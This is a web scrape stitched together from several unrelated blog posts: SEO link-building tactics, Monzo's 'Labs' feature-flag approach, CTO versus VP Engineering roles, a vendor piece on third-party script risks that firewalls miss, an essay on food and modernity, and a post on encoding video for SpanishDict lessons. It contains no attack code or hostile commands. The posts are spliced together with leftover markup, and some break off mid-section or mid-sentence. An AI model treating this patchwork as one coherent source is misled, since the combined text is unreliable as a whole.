<p><span>Link building can be one of the more challenging aspects of SEO. In this post, we’ll answer how to do link building, and walk you through 8 actionable strategies to get a ton of high-quality links to your site.&nbsp;</span></p>
<h2><span>Best Link Building Tactics&nbsp;</span></h2>
<h3><b>1. Blog commenting&nbsp;</b></h3>
<p><span>Building links on blogs could be as easy as leaving a valuable message in the “comments” section of a blog. The sooner you leave a comment after the blog publishes, the better.&nbsp;</span></p>
<p><span>Blog comments also come with two other great benefits:</span></p>
<ol>
<li><span>They help you build relationships within online communities.</span></li>
<li><span>They offer targeted traffic back to your website.</span></li>
</ol>
<p><span>One thing to note is that the comment submission box must have a field to add your website.&nbsp;</span></p>
<p><img src="https://colonyspark.com/wp-content/uploads/2020/08/Comment-form-e1598203782633.png" alt="The comment submission box must have a field to add your website." width="602" height="442"></p>
<p><span>The website field means you can include a link back to your site, that anyone who reads your comment can click. </span><b>Google notices when you get links back from your comments on large, well-established </b><b>blogs</b><b>.</b><span> According to</span> <a href="https://neilpatel.com/blog/blog-comments-links/"><span>this study from Neil Patel</span></a><span>, </span><span>links from high authority sites, even through user-generated content, help with rankings.&nbsp;</span></p>
<p><span>If you choose to use this tactic, you’ll want to focus on blogs that allow Dofollow links in comments. Google uses Dofollow links to figure out how many users link to your page and determine your website’s authority. The more Dofollow links you have, the higher you’ll show up on Google search.&nbsp;</span></p>
<p><span>If you aren’t sure how to find blogs that allow DoFollow links, Google search the following:</span></p>
<ul>
<li><span>“Dofollow blogs” – you’ll discover articles listing out blogs that have Dofollow links.&nbsp;</span></li>
<li><a href="http://followlist.com/"><span>Followlist</span></a><span> – use this directory to find blogs that have Dofollow links.</span></li>
</ul>
<p><span>Actively comment on your niche’s blog posts, and be sure your comment adds value to the topic of the blog. Posting spammy links will just cause your comment to be removed.</span></p>
<h3><b>2. </b> <b>Expert roundup</b></h3>
<p><span>Building alliances with companies that offer products that are complementary to yours or influencers in your space give you a win-win relationship.&nbsp;</span></p>
<p><b>Sharing the opinions of leaders in your industry via an expert roundup blog post will help you build backlinks, boost your website’s traffic, and add SEO value.</b></p>
<p><span>This type of blog post gets a lot of traffic since the experts who are part of the roundup sometimes share the content with their audience. And as an industry expert, they likely have a large following.&nbsp;</span></p>
<p><span>Since roundups are valuable pieces of content, they have a higher chance of being shared by other people, </span><i><span>even if they weren’t one of the contributors</span></i><span>. Plus, the backlinks you’ll get from major websites will boost your domain authority and search ranking.&nbsp;</span></p>
<p><span>To create an expert roundup post, think about a topic relevant to your industry that you’ve always wanted to discuss. Ask the most relevant questions about the topic in your blog post, and answer them with experts in your field.&nbsp;</span></p>
<p><span>Consider using a tool like </span><a href="https://ninjaoutreach.com/"><span>Ninja Outreach</span></a><span> to find and reach out to industry leaders if you’re not sure where to find experts for your roundup post.&nbsp;</span></p>
<h3><b>3. </b> <b>Ego bait</b></h3>
<p><span>Who doesn’t love a little ego boost?</span></p>
<p><span>The ‘ego bait’ link building tactic is similar to the expert roundup strategy. </span><b>If you positively feature another person on your website or blog, they’re more likely to return the favor.</b></p>
<p><span>Like most people, experts and influencers want to be recognized for their accomplishments and skills. By sharing those accomplishments with your audience, you inspire those experts to share your content and link to your website.</span><span> The key here is creating content around a specific person, business, or group of people.</span></p>
<p><span>The main types of ego bait content are:</span></p>
<ul>
<li><span>Interviews</span></li>
<li><span>Roundup Posts</span></li>
<li><span>Listicles</span></li>
<li><span>Directories</span></li>
<li><span>Awards</span></li>
</ul>
<p><span>For example, if your business is a small tech startup, you can make a “51 Game Changers in Tech You Should Follow” list and mention different personalities and websites. They’ll appreciate it and probably will share the content with a link. Pick the right type of content and industry leaders from complementary businesses to reach your SEO goals.</span></p>
<h3><b>4. </b> <b>Local directories</b></h3>
<p><span>Adding your business to an online directory is an easy way to build links and draw traffic to your site.&nbsp;</span></p>
<p><span>People use online directories to locate businesses that sell what they’re shopping for at that very moment—</span><b>since directories index businesses by niche, location, and category, adding your website to a directory attracts highly-targeted (and high purchase-intent) traffic to your website.&nbsp;</b></p>
<p><span>You increase your chances of sales by having your business listed in a directory, and you also boost your business’ visibility. Online directories are trusted sources and are typically high-ranking on Google.&nbsp;</span></p>
<p><span>Most of the time, adding your business to a directory costs you nothing. Many online directories – for example, </span><a href="https://www.bingplaces.com/"><span>Bing Places</span></a><span>, </span><a href="https://biz.yelp.com/"><span>Yelp</span></a><span>, and </span><a href="https://foursquare.com/"><span>Foursquare</span></a><span> – allow you to submit your business information for free. Still, some online directories do charge a listing fee.</span></p>
<p><b>Choose a directory relevant to your niche, and the chances of reaching your target audience and boosting your SEO will be much higher.</b></p>
<h3><b>5. </b> <b>Brand mentions</b></h3>
<p><b>Unlinked brand mentions are when people mention your brand online without linking to your website–which means you’re already halfway towards earning a link. </b><span>The blogger already knows of your business; thus, you have the perfect excuse to reach out and ask for a link back to your site.</span></p>
<p><span>What kind of mentions can you link back to? Anything that mentions you or your brand can serve as a backlink, for example, product names, services, slogans, and even your name.</span></p>
<p><span>To start, create a list of any unique products, services, and brand representatives for your business. Then, you can search them on Google or use a tool like </span><a href="https://ahrefs.com/content-explorer"><span>Ahrefs Content Explorer</span></a><span> to find mentions of your brand online. If you are building awareness and already started doing some traditional marketing, such as press releases, you’ll likely find articles where you or your brand is mentioned online.&nbsp;</span></p>
<p><span>A few rules before asking for a link: first, don’t be pushy. Ask yourself if adding a link makes sense within the context of the article. Secondly, don’t request links if they don’t add value. If the article expresses an unfavorable or critical opinion of your brand, you probably shouldn’t ask for a link. Last, always offer value. If something could be expanded on or improved in the article, don’t be afraid to mention it in your email outreach. Using these three rules, you’re more likely to get a favorable response when you ask for a link to your website.&nbsp;</span></p>
<h3><b>6. </b> <b>Sponsorships</b></h3>
<p><span>If you want, you can secure backlinks from local projects or causes you already support. </span><b>Many cause-based sites have pages dedicated to donors where they show their sponsors’ logos and link to their websites.</b></p>
<p><i><span>Different sponsorship opportunities</span></i></p>
<ul>
<li><b>Sponsoring an event</b><span> to get publicity and brand visibility.&nbsp;</span></li>
<li><b>Consider sponsoring a podcast</b><span> or a webinar. You may get a backlink from it.</span></li>
<li><b>Conference sponsorships</b><span> get your name in front of a niche audience.&nbsp;</span></li>
<li><b>Non-profit sponsorships</b><span> stand for a great cause while also helping you achieve an authoritative link.&nbsp;</span></li>
</ul>
<h3><b>7. </b> <b>Link building tools</b></h3>
<p><b>Link building tools can help you to find backlink opportunities.</b><span> If you have some money to spend on tools, we have some useful options:</span></p>

<p><b>Guest posts are probably the number one way companies look for backlinks</b><span>. But is the </span><a href="https://moz.com/learn/seo/what-is-link-equity"><span>link equity</span></a><span>&nbsp;being passed to your site? Unlikely — but maybe.&nbsp;</span></p>
<p><span>John Mueller, a Google senior webmaster trends analyst, recently said on </span><a href="https://twitter.com/JohnMu/status/1271697162762686464"><span>Twitter</span></a><span> that links within guest blog posts or contributed content should be </span><a href="https://backlinko.com/nofollow-link"><span>nofollowed</span></a><span>.</span></p>
<blockquote>
<p dir="ltr" lang="en">Essentially if the link is within the guest post, it should be nofollow, even if it’s a “natural” link you’re adding there.</p>
<p>FWIW none of this is new, and I’m not aware of any plans to ramp up manual reviews of this. We catch most of these algorithmically anyway.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>As Product Managers, how can we create new features and improvements to our products whilst also balancing the trade-offs of user experience and foster a community? In this post, I'm going to be discussing a new approach I've been watching closely.</p><div><p>As digital product creators we all know the importance of getting feedback from users throughout the lifecycle of our of product - that goes without saying hopefully, however, when it comes to building mobile apps and getting early feedback throughout the lifecycle of your product there are a few approaches to consider at different phases:</p><ol role="list"><li><strong>Pre-launch:</strong> low/high fidelity usability prototype testing (Maze.design, UsabilityHub etc.)</li><li><strong>Alpha/beta launch:</strong> Surveys, user interviews, feedback widgets, TestFlight</li><li><strong>Post launch:</strong> Focus groups, surveys, community forums, user interviews, feedback widgets, TestFlight and .....</li></ol><p>In this post I will be discussing a new approach I've been watching closely the last few years relating to post-launch testing and community building for mobile apps - however, it should be noted that the majority of what I mention can be used in web apps too.</p><h2>A sandbox environment for experimenting with new ideas</h2><p>I've noticed over the last few years a number of consumer based tech startups launching versions of 'Labs' within their products. These lab features essentially allow users to opt-in to gain early access to new and experimental features within the product - using a <a href="https://en.wikipedia.org/wiki/Feature_toggle">feature toggle/flag</a> system. </p><blockquote>It's basically like running multiple versions of your app in one build. </blockquote><p>This feature allows users to activate the new features and improvements before it's considered for a general release.</p><p>One UK based Fintech startup I personally use called '<a href="https://monzo.com/">Monzo</a>' has been doing a fantastic job at this since 2018 when they first launched 'Monzo labs' for their iOS and Android customers.</p><p>‍</p><figure id="w-node-cee7df06e50a-cb51e83d"><p><img src="https://uploads-ssl.webflow.com/5e5fb94aa7ed262873f66bcf/5f16f1521de5c7f6bc875243_monzo-labs.png" alt="Monzo Labs "></p></figure><p>‍</p><blockquote>We believe that the best way to build a brilliant product is by releasing features early, and getting feedback from you - Monzo</blockquote><p>‍</p><p>Monzo Labs access can be found in the settings - it's not glaringly obvious but again it's not for everyone. From Monzo Labs you can view the new features or improvements and decide which ones you want to opt into - it's as simple as that.</p><p>‍</p><figure id="w-node-6a886544b45a-cb51e83d"><p><img src="https://uploads-ssl.webflow.com/5e5fb94aa7ed262873f66bcf/5f16f16a270007497f2297c3_sneak-peeks-on-iphone.png" alt="Monzo labs mockup"></p></figure><p>‍</p><h2>Nurturing a community of early adopters </h2><p>In an attempt to create an open discussion about the new features within Monzo Labs - they create a new topic for each new feature within <a href="https://community.monzo.com/c/making-monzo/labs">their community forum</a> allowing users of the labs features to discuss their initial thoughts as a community. By providing this open forum the product and design team at Monzo can join the discussion and interact with users in an effort to shape the new feature based on community feedback.</p><p>Further to that, Monzo also created a twitter handle called '<a href="https://twitter.com/MakingMonzo">Making Monzo</a>' - which provides yet another medium for users to see new features coming to Labs and allows users to provide their feedback publically via Twitter.</p><p>These community based features provide users and evangelists with the ability to shape and influence the product, providing more buy-in from the community of users and subsequently increasing engagement and providing more value to the product with the overall aim to increase retention.</p><p>‍</p><h2>TestFlight vs Labs</h2><p>As a Product Manager, I find the idea of creating a sandbox environment to test new and early stage ideas and improvements with a group of early adopters super exciting as previous traditional approaches conducted via TestFlight can be cumbersome for designers, PM's, developers and more importantly the beta testers themselves.</p><p>TestFlight can work with very early adopters and evangelist - particularly technical users, however, it's tricky explaining to a non-technical user that they need to install TestFlight first and go back to the email and then install the TestFlight build - it's a big ask. Further to that, in my experience, a lot of confusion can be caused by two builds on a users device for those who haven't used TestFlight before.</p><p>That's not to say there isn't a need for TestFlight for internal test purposes or at the early stages during an Alpha release or early Beta - but I personally think the user experience of integrated Labs features within the consumer build is a better strategy. Il touch more on this shortly. </p><p>‍</p><figure id="w-node-53afbe4460da-cb51e83d"><p><img src="https://uploads-ssl.webflow.com/5e5fb94aa7ed262873f66bcf/5f16f1cba9eebc4a197fbc0f_1_2kIL4HV7-y2MbzfMRmHQAQ.jpeg" alt="Tech adoption life cycle graphic"></p></figure><p>‍</p><h2>The Technology Adoption Life Cycle </h2><p>Although Geoffrey Moore's 'Crossing The Chasm' model refers to the Technology Adoption Life Cycle, I think it's a great way to breakdown the types of users who would be willing to adopt each approach.</p><p>The types of consumers that will buy a product&nbsp;into five categories:</p><ul role="list"><li><strong>Innovators </strong>seek out novel technology; it’s like a hobby for them. There aren’t many Innovators, and because they’ll try new things, they are important. Other people see them use new things and feel braver themselves about trying them.</li><li><strong>Early Adopters</strong> are quick to understand the benefits of new technology. Unlike the Innovators, they don’t love technology for its own sake. </li><li><strong>Early Majority</strong> are practical minded consumers. If a product seems useful, this group will try it. The Early Majority are cautious of fads.</li><li><strong>Late Majority</strong> consumers wait for something to become well established. They don’t feel confident in their ability to deal with technology.</li><li><strong>Laggards</strong> are those consumers who, for personal and/or economic reasons, are not looking to buy new technology.</li></ul><p>Personally I think the types of users that would be interested and willing to enroll into TestFlight builds fall into the Innovators and potentially the Early adopter category. These segments know that being first with new technology likely means that there will be glitches and bugs, but they are comfortable with that and their expectations are aligned. </p><p>The types of users who would be encouraged to use a Labs feature would include Innovators and Early adopters but also the 'Early Majority'. They favor evolution over revolution; they want things to work smoothly. Lab features are typically more stable and tend to have less problematic bugs than early TestFlight builds. </p><p>It should be noted that <a href="https://testflight.apple.com/join/2NZLBFyb">Monzo also use TestFlight</a> alongside their 'Labs' feature. I would presume the TestFlight builds are for their super users who want to get super early access to new improvements and features with Labs catering to the general consumers who would prefer a more stable experience with fewer bugs.</p><p>‍</p><h2>The tradeoffs to consider </h2><p>From my personal experience, there is a trade-off that needs to be addressed. Feature flags within a product need to be carefully considered and can be tricky to manage as you continue to add further features. It also adds more time to your builds compared to a simple TestFlight build.</p><p>There is still room for &nbsp;improvement though - in particular, most lab features tend to neglect a smooth and frictionless feedback loop and add unnecessary friction for users to provide feedback. More can be done to reduce this friction and improve the feedback loop with the end-user.</p><p>‍</p><blockquote>“As with anything in Monzo Labs, this is a work in progress. It’ll be a little rough around the edges and can’t guarantee it’ll be a 100% smooth experience. But your feedback will help make it great before we finally bring it to everyone!” - Monzo</blockquote><p>‍</p><p>To improve this, I would consider adding action based notifications - first monitoring users who have opted-in and adopted the new feature by creating an automated action based trigger a day after the action has been complete. This could consist of a popup, push notification or email - prompting the user to provide some quick feedback through a short form or widget.</p><p>However, if you working on a more mature product with thousands/ millions of users I would consider the approach Monzo took with their Discourse community forum as it removes the asynchronous feedback and allows users to share their feedback with each other. Perhaps a blend of the two could be considered. </p><p>Lastly, creating a lab environment isn't exclusive to mobile apps and can be added to any web based platform too using the same principles as I outlined above.</p><p>I'm keen to hear of any other strategies or lab features. If you know of any I might have overlooked please get in-touch - I'm always looking to review new examples.</p><p>‍</p></div></div>]]>

<p>I was recently asked whether the common distinction in startups between a CTO and a VP of Engineering is justified or not. My thinking is that for most organizations with less than 200 engineers, this separation isn’t a rule of nature and that you might be better off without it. It’s not needed unless it’s <em>needed</em>. Let’s start with a quick recap.</p>



<h3>Why are the roles split?</h3>



<p>Going by the book, the story virtually always starts the same way. A new startup is born. One of the co-founders is the technical one, and so she is dubbed CTO. If the company is successful and keeps growing, one of the following happens:</p>



<ul><li><strong>Let me code:</strong> The CTO realizes she’d much rather be typing at the keyboard than do the pesky leadership thing that takes up more of her time as the company grows. At this point, some companies hire a VP Engineering. The CTO keeps her title, even though she is acting as an equivalent of a staff engineer. </li><li><strong>Innovation-targeted:</strong> The CTO decides she does not want to (or shouldn’t) be in charge of people management, but still has a crucial executive role. A VPE is hired to take care of that responsibility, and the CTO maintains the responsibility of tech innovation, architecture, or evangelism (i.e., speaking in conferences).</li><li><strong>The non-technical CTO:</strong> The CTO slowly shifts to do non-technical work that’s crucial for the company, like product leadership or rainmaking. They often retain their CTO title, though they don’t have anything to do with the tech the company is creating. <br></li></ul>



<p>One last case, which is not as frequent, is when there are multiple techie founders. Then, a company with no employees is started at day one with a CTO and a VP. <em>*shrug*</em></p>



<h3>What is best for your company?</h3>



<p>Advising clients, I recommend having a single tech executive in at least 90% of the cases. When there’s a single person in charge, you reduce communication and politics, increase ownership and accountability, and avoid at least one adverse effect of Conway’s law.</p>



<p>Is it harder for that tech executive to have everything under her umbrella? Not necessarily. In most cases, delivery is intertwined with innovation—the same people should be doing both. Adding another executive role doesn’t solve that, but actually creates needless silos. </p>



<p>Is your company filing to go public, and the executive needs more time? Fine. Do you have to retain both titles because otherwise, it will result in one of the founders leaving? Alright. Do what you have to do. Nevertheless, keep in mind that this is not a requirement and often not the best option. You have other doors to go through.</p>

<h6><em>In spite of having the best web application firewall (WAF) system securing your website, the risk of a third-party web breach is all over</em></h6>
<p><img loading="lazy" src="https://www.reflectiz.com/wp-content/uploads/2020/06/WAF-doesnt-work-for-third-parties-1024X512-300x150.jpg" alt="" width="666" height="333" srcset="https://www.reflectiz.com/wp-content/uploads/2020/06/WAF-doesnt-work-for-third-parties-1024X512-300x150.jpg 300w, https://www.reflectiz.com/wp-content/uploads/2020/06/WAF-doesnt-work-for-third-parties-1024X512-768x384.jpg 768w, https://www.reflectiz.com/wp-content/uploads/2020/06/WAF-doesnt-work-for-third-parties-1024X512.jpg 1024w" sizes="(max-width: 666px) 100vw, 666px"></p>
<p>An interactive, dynamic website is the ‘online’ face of your business.<br>
It is also a critical factor in deciding the success of your organization, but at the same time, it presents severe blind spot risks – between the user and your website.</p>
<p>Most secured businesses are already using top brand security perimeters such as Next Generation firewalls or Web Application Firewall (WAF) solutions on to their websites to ward off threats from cybercriminals, assuming they are reasonably safe from these online risks. However, that would not be enough in today’s ever-changing technology space, as these security measures do not protect you from web third-party threats which are presented ‘inside’ your websites – with or without your consent.</p>
<h5><strong>The Role of Firewalls and WAFs </strong></h5>
<p>Both firewall and WAF solutions monitor the traffic between the end-user and the website. Firewalls are put more emphasis on the 3<sup>rd</sup> and 4<sup>th</sup> layer of OSI layer architecture, which is the TCP/IP data, &nbsp;while few claim to provide additional support for the application level. WAFs are focusing on traffic monitoring in the 7<sup>th</sup> layer, i.e., the HTTP request and malicious craft requests in specific. Together, this combination should be able to block any website attacking attempt, or any malicious activity from end-users at the website, intentionally or accidentally. These solutions can protect against attacks such as code injection (XSS, SQLi, CSRF) as well as DDoS or other misconfiguration issues. <strong>But these WAF and firewall solutions only cover the threats partially, leaving a huge third-party risk blind spot on your website</strong>.</p>

<p><em>Websites today are integrating more third-party components, but do they take all the necessary means to protect themselves?</em></p>
<h5><strong>So, What Is the Underlying Problem? Where’s the Blind-Spot? </strong></h5>
<p>A third-party script runs on the client-side, the user browser, and establishes a connection between the end-user and the third-party vendor itself. <strong>It means that the entire connection between the end-user and any third-party on a given website is <u>not</u> monitored by the existing security solutions, such as a firewall or WAF. But it gets even worse. These security tools are not even </strong><strong>noticing</strong><strong> the communication taking place between both the endpoints.</strong> This basically leaves you no ability to know what these third-party scripts actually do: where they run, how they are communicating with other components or remote domains. From pure privacy point-of-view, these components perform tracking independently. Once again, your capabilities to detect such actions that affect regulations, GDPR or CCPA, is still limited.</p>
<p>As these components are mostly third-parties, they are beginning to load when the user first visit the page. But what is loaded? It can be changed each time, depending on the vendor’s profile for the user, or &nbsp;on a new version release. Even if you do use a second layer of security, such as code review or penetration testing, the conclusion is still clear – these kind of security perimeters will only be relevant for the testing day itself and several use cases in specific.</p>
<p>What would you do, when the vendor releases a new version, fully automatically and within the already existing connection between this vendor (or this vendor vendors’) and your end user? Security controls, such as firewall or WAF, can defend the web-server from malicious actor’s activities, but the big questions are what can protect the end-users themselves and? Which of these tools have the access to the inspected data?</p>
<p>Surprisingly, the average security department spends millions of dollars on creating a strong perimeter defense for the website, and validating any code that is about to be upload. But it all misses a big chunk of code: dozens third-parties code, each can bypass the process completely and get access to your most sensitive data.</p>
<h5><strong>Your indispensable t</strong><strong>hird-parties: “Handle with care” </strong></h5>
<p>In this era of competition, the services that third-party web tools and applications offer, are invariable for enhanced functionality of any business website. However, ignoring the risk they pose will be careless, especially while considering they have access to your sensitive and confidential data residing on your website. Let’s remember, these components can access and operate your web pages from remote locations. You may think that you have protected your website with the highest degree of security; however, can you guarantee that web third-parties that are integrated into the backbone of your website and are authorized by you to perform any operation on the website, will also do the same? Maybe, or maybe not.</p>
<p>Are you willing to be accountable for it? Well, judging by the latest fines that were issued by the ICO to British Airways, it is evident that the theft of client’s personal data by web third-party script is a violation of privacy regulation and may result in huge penalties to the company, in this case a £183 million fine! That is a significant number for any organization. It can be avoided with deploying the right security solution for your website.</p>

	<!-- .entry-header -->

	
	<div>

		<p><span>There’s something very revealing to be found in the way we interact with food which can tell us a lot about our relationship with modernity. Alongside water and shelter, food too is an immediate and necessary </span><span><em><span>need</span></em></span><span> for all men and women, unlike water we don’t take it for granted, at least not to the extent we do with water, we do however have a rather peculiar relationship with food…</span></p>
<p><span>Firstly let’s look at what food even is. At its most basic level food is sustenance, it’s the fuel that keeps us going. We are biological ‘machines’ which need fuel to keep us performing whatever actions we wish to perform. On a certain level of communication this is our basic reality, one in which we are an engine which performs functions and needs fuel to do. Now, if you wish to lose weight this is actually the most practical way to think about food, as fuel. However, there are of course long traditions of food as a cultural object or pastime, certain places have certain cuisines which usually represent the temperament of their culture quite exactly. There is also the largely ignored history and philosophy of senses </span><span><em><span>other</span></em></span><span> than sight and hearing, so to simply understand food as some additional extra would be silly, however, our relationship with it isn’t a healthy one, its a quintessentially modern one, in which food becomes entertainment. This isn’t exactly a new idea, but food was perhaps the first example of where the substance of something began to mutate into a different conception altogether. </span></p>
<p><span>What I mean when I say that our relationship with food has altered into one of entertainment, is that the very purpose of food has been lost, but I don’t think a return to this very basic purpose has to exclude the beauty of food itself and its historical origins. The attitude towards food within modernity is one which allows it to become a sideshow of existence, one which allows the empire of signs to overtake all faculties and demote food to some kind of existence-filler, something to pass the time. Whereas, in reality, food is something that should be kept at the forefront of one’s mind, </span><span><em><span>especially</span></em></span><span> when you’re consuming it. The phrase ‘You are what you eat.’ is thrown around rather callously as some pithy bureaucratic message regarding personal health, however, when you really begin to think about that saying, there’s more to it than meets the eye – as there usually is with those old, wise sayings. </span></p>
<p><span>Because you quite </span><span><em><span>literally</span></em></span><span> are what you eat, in both a physical and metaphorical sense. What you consume is the fuel used to </span><span><em><span>create</span></em></span><span> you and allow you to continue, if you intake bad food, or junk fuel, then your body and you are going to feel like junk. And, metaphorically speaking, if you intake cheap, quick and easy food, you will become cheap, quick and easy, developing an impatience with respect to existence itself. The contemporary attitude towards food is one in which is relegated in favor of an act deemed worthy of one’s attention. There is even a culture with regard to finding good videos to watch whilst one is eating, as if literally fueling one’s body and enjoying the flavors of various foods wasn’t enough. People will obviously state that I’m some reactionary – ‘Oh, you think it’s ridiculous that people might want to watch TV or listen to something whilst eating?’ – well, yes and no. No, I don’t think it’s </span><span><em><span>ridiculous</span></em></span><span> per se, however, I do think it’s done so from a position of privilege. And so also, yes, yes I do think it’s ridiculous, it’s ridiculous that we’ve got to a state of affairs where if one is eating that isn’t the act which is actually primary in their thought. Such a thought process, wherein the food itself is no longer the primary part of the meal, is a great outline for the way in which modernity tends to strangle and control your most basic functions, turning them into something which changes your existence into a fairground attraction. </span></p>
<p><span><em><span>Everything</span></em></span><span> in modernity </span><span><em><span>must</span></em></span><span> be entertainment, </span><span><em><span>or,</span></em></span><span> must at least be </span><span><em><span>able</span></em></span><span> to be entertainment. Your morning commute to work is filled with radio, podcasts or music, a short walk anywhere is done with headphones in as to cancel our the world, eating dinner is done in front of the TV or with something on in the background, each item of consumption has an addition which makes it in some ways ‘fun’, your work break is filled with biscuits and tea, your most basic functions have been gamified into empty habits for the sake of a dopamine rush, everything is logged, everything is projected and everything is beaconed to the crowds for approval. At all times, one must be entertained, for if they are not being entertained they are having a </span><span><em><span>bad</span></em></span><span> time, and that – within modernity – is a fate worse than death. You’ll notice that all those things I listed, commuting/walking to work, going on a walk, eating meals, taking some time our/having a break etc. these are all the simple pleasures of life which can be enacted for free, and not only that, are actually both free </span><span><em><span>and</span></em></span><span> enjoyable. Modernity, of course, tends to hate this. The idea that one could go out and be fulfilled and content without purchase, or without purchasing something which they then attend to as if it was </span><span><em><span>part of</span></em></span><span> them. </span></p>
<p><span>Food is the greatest example of this, this compulsion of modernity to make you believe you never have enough, that nothing is enough until every sense is absolutely overflowing with data and information that you can hardly think. Modernity </span><span><em><span>adores</span></em></span><span> noise, for without noise one might actually be able to anchor themselves, think for themselves and finally attend to that which they </span><span><em><span>actually</span></em></span><span> need/want. We have been removed from everything vital to us, everything which maintains the simplicity is stripped away, for the purpose of trying to prove to us that we don’t want simplicity, but we want complexity, with all its trinkets, additions and extras. And this is what modernity wishes to prove to you with the overarching idea of entertainment, it is not enough to live a simple, quiet and calm life, one must be entertained all the time; one must in constant states of emotional pull and tug, as if to exist contently was a sin in itself, whereas the opposite is the truth. Modernity loves complexity because it’s easy to get lost in it, it’s easy to lose what exactly it was you originally wanted, if anything, and search endlessly for a desired object, other or ism, that accursed thing which will finally satisfy the perpetual itch put upon you by modernity. </span></p>

            <section>
                <div>
                    <p>Last week I <a href="https://sean.pk/building-video-grammar-lessons-for-spanishdict/">wrote about the new SpanishDict video lessons feature</a>, which has been a huge success, even with the school year not yet in full swing. Yesterday users completed almost three thousand lessons, and we already have five users that have completed all forty-two Spanish lessons, a feat that requires several hours of dedication! If you haven't yet read <a href="https://sean.pk/building-video-grammar-lessons-for-spanishdict/">last week's post</a>, please do that first, as it will provide some helpful context about how the video lessons feature works. In this post, I'll talk about how we engineered what we hope is a great video experience, regardless of a user's browser choice and connection speed.</p><p>As you'll recall from last week's post, every question in every lesson, regardless of question type, has a video. From discussions with the product team, it seemed like there were two main goals for these videos. The first was that a question's video should start playing right when the user advances to it. The second was that the videos should be high quality, which seemed to mean no noticeable blurriness. Engineering added a third goal, keeping the video files as small as possible. Keeping the file sizes small would result in us paying less for data transfer, users downloading the videos faster, and mobile users consuming less of their data plans when taking lessons. In the sections to come, I'll go through all of these goals and how we achieved them. Interestingly, each of these respective goals complicated our ability to achieve the other two.</p><figure><div><div><p><img src="https://s3.amazonaws.com/sean-blog-images/2020/08/Screen-Shot-2020-08-25-at-11.43.09-AM.png" width="1076" height="1388" alt=""></p><p><img src="https://s3.amazonaws.com/sean-blog-images/2020/08/Screen-Shot-2020-08-25-at-11.45.58-AM.png" width="1090" height="1238" alt=""></p></div></div></figure><p>Because of the need to preload videos and the need to have enough control over the videos to beep out certain sections, we felt strongly that we needed to host the videos ourselves rather than rely on a video hosting provider like Youtube or Vimeo. As such, we needed to get up to speed on serving video on the web!</p><h2 id="video-formats">Video Formats</h2><p>There are many types of video formats, and every browser offers different support. A video's extension, for instance <strong>.mp4</strong> or <strong>.webm</strong>, is its container format. The container can have both video and audio within it, both of which could be in a variety of formats. A <strong>.mp4</strong> file could have <strong>h264</strong> video and <strong>aac</strong> audio, or it could have <strong>hevc</strong> video and <strong>opus</strong> audio. There are many different combinations, and any of the three components, container format, audio format, or video format could cause a video to be unable to play in a given browser. Because the user's operating system plays such a part in video playback, sometimes the same browser version will be able to play a certain video file in a newer version of an operating system but not an older version.</p><p>If you want full browser support, the easiest thing to do is to just encode all your videos in an <strong>mp4</strong> container with <strong>h264</strong> video and <strong>aac</strong> audio. This provides support all the way back to Internet Explorer 9, and all modern browsers have supported this type of video for years. However, there are many new video codecs which can produce videos of the same quality at much smaller file sizes than those produced by <strong>h264</strong>. Two of these which have been around for a while are <strong>VP9</strong> video in a <strong>webm</strong> container and <strong>hevc</strong> video in a <strong>mp4</strong> container. </p><p><strong>VP9/webm</strong> video has been supported in both Firefox and Chrome for 5+ years and is also supported by the new Chromium-powered Edge. The <strong>hevc/mp4</strong> video format has been supported since desktop Safari 11 (but only for MacOS High Sierra or later) and since iOS Safari 11. Both of these formats can encode video at the same quality as <strong>h264/mp4</strong> but with 30-50% smaller file sizes. By using these two formats in addition to <strong>h264/mp4</strong>, we would be able to serve highly compressed video to more than 95% of our users, falling back to a larger video format for full support.</p><figure><div><div><p><img src="https://s3.amazonaws.com/sean-blog-images/2020/08/Screen-Shot-2020-08-25-at-12.37.02-PM.png" width="1940" height="896" alt=""></p><p><img src="https://s3.amazonaws.com/sean-blog-images/2020/08/Screen-Shot-2020-08-25-at-12.51.31-PM.png" width="1964" height="962" alt=""></p></div></div><figcaption>Caniuse charts showing browser support of various codecs</figcaption></figure><p>It's worth noting that both <strong>VP9/webm</strong> and <strong>hevc/mp4</strong> formats have successors that boast even better compression improvements and which will start to get better adoption in the coming years. The successor to <strong>VP9</strong> is <strong>AV1</strong>, which does have some browser support now, but which we found to not be mature enough to use quite yet. Encoding videos in this format is still quite slow and expensive, and we were unable to get any <strong>AV1</strong> videos we produced to successfully seek in Firefox or Chrome when testing on MacOS. The successor to <strong>hevc</strong> is <strong>vvc</strong>, which was finalized last month and is not yet supported in any browsers.</p><p>All right, so at this point we knew the three video formats we wanted to generate for every question, <strong>h264/mp4</strong>, <strong>hevc/mp4</strong>, and <strong>VP9/webm</strong>. However, we still needed to figure out what resolutions to use for our videos. On desktop, our videos are <strong>480x270</strong>, and on mobile devices, our video needs to be as wide as the screen, up to a maximum of 480 pixels wide. Most mobile phones fall between 360 and 414 pixels wide, so we made the call to go ahead and serve the 480px-wide videos to mobile users for simplicity, but if we really wanted to hone in on bandwidth, we could go back and generate videos for several common mobile breakpoints.</p><p>It's well-known that in order to avoid blurry images and serve the minimal image file possible, you should use something like <strong><a href="https://developer.mozilla.org/en-US/docs/Learn/HTML/Multimedia_and_embedding/Responsive_images">srcset</a></strong> to serve higher resolution images to users with high-density screens, like Apple's Retina displays. However, we couldn't find much written about this for video. We wanted to know if serving a <strong>480x270</strong> video into a <strong>480x270</strong> video tag on a <strong>2x</strong> or a <strong>3x</strong> device would result in the video appearing blurry, so we tested this out. Below is a comparison between a <strong>480x270</strong> video and a <strong>980x540</strong> video on a 2x device. Both videos were generated using similar quality settings.</p><figure><div><div><p><img src="https://s3.amazonaws.com/sean-blog-images/2020/08/Screen-Shot-2020-08-25-at-1.54.01-PM.png" width="1008" height="568" alt=""></p><p><img src="https://s3.amazonaws.com/sean-blog-images/2020/08/Screen-Shot-2020-08-25-at-1.52.30-PM.png" width="1000" height="578" alt=""></p></div></div><figcaption>480x270 video in a 480x270 container on a 2x device (left), 960x540 video in a 480x270 container on a 2x device (right)</figcaption></figure><p>You can see that the screenshot from the <strong>1x</strong> video on the left is of noticeably lower quality than the <strong>2x</strong> video on the right. We found that even if we drastically increased the quality of the <strong>1x</strong> video compared to the <strong>2x</strong> video, the <strong>2x</strong> video still looked a lot better than the <strong>1x</strong> video when viewed on a <strong>2x</strong> device. As a result, we decided to generate three video sizes (<strong>1x</strong>, <strong>2x</strong>, and <strong>3x</strong>) in each format, to provide clear video for users with varying screen pixel densities. We also generated a very low quality version of the video at a smaller resolution, 